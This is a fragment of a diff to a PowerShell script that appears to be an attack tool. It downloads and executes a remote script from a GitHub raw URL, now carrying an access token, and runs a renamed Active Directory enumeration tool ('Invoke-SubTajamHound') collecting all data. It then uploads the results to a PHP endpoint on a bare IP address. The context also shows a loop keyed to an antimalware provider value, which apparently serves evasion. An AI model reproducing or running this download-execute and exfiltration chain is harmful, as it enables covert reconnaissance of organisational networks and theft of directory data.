@@ -33,7 +33,7 @@ while ($AntimalwareProvider -ne 0)
 }
 
 $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/Invoke-SubTajamHound.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/uni-bad/direktori-aktif/Invoke-SubTajamHound.ps1?token=GHSAT0AAAAAACKFXBTDPEMJGP4RPGRT3M2MZKQ5QWQ')
 $tajamhoundOutput = Invoke-SubTajamHound -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
 $tajamhoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
 Invoke-WebRequest -Uri "http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php" -Method POST -ContentType 'text/plain' -InFile "log.txt"
